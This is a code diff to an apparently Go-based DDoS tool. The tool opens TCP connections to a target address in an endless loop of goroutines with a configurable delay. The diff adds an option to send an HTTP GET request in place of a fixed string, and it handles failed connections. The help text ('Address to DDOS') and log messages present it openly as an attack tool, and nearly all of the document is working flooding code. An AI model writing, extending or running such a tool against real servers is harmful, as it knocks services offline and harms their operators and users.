@@ -10,12 +10,19 @@ import (
 	"time"
 )
 
-func ddos(address string) {
+func ddos(address string, http bool) {
 	conn, err := net.Dial("tcp", address)
 	if err != nil {
 		log.Printf("Couldn't connect to server (%v)...", err)
+		return
 	}
-	fmt.Fprint(conn, "Message18CharsLong")
+	message := ""
+	if http {
+		message = "GET / HTTP/1.0\n"
+	} else {
+		message = "abcdefghijklmnopqrstuvwxyz1234567890"
+	}
+	fmt.Fprint(conn, message)
 	conn.Close()
 }
 
@@ -25,6 +32,7 @@ func main() {
 	parser := argparse.NewParser("print", "Prints provided string to stdout")
 	address := parser.String("a", "address", &argparse.Options{Required: true, Help: "Address to DDOS"})
 	delay := parser.Int("d", "delay", &argparse.Options{Required: false, Help: "Packet delay", Default: 0})
+	http := parser.Flag("p", "http", &argparse.Options{Required: false, Help: "Whether to use HTTP", Default: false})
 	err := parser.Parse(os.Args)
 	if err != nil {
 		fmt.Print(parser.Usage(err))
@@ -39,7 +47,13 @@ func main() {
 	if err != nil {
 		log.Fatal(err)
 	}
-	_, err = fmt.Fprintf(conn, "Message18CharsLong")
+	message := ""
+	if *http {
+		message = "GET / HTTP/1.0\n"
+	} else {
+		message = "abcdefghijklmnopqrstuvwxyz1234567890"
+	}
+	_, err = fmt.Fprint(conn, message)
 	if err != nil {
 		panic(err)
 	}
@@ -51,7 +65,7 @@ func main() {
 	log.Printf("Starting DDOS...")
 
 	for {
-		go ddos(*address)
+		go ddos(*address, *http)
 		time.Sleep(time.Millisecond * time.Duration(*delay))
 	}
 }
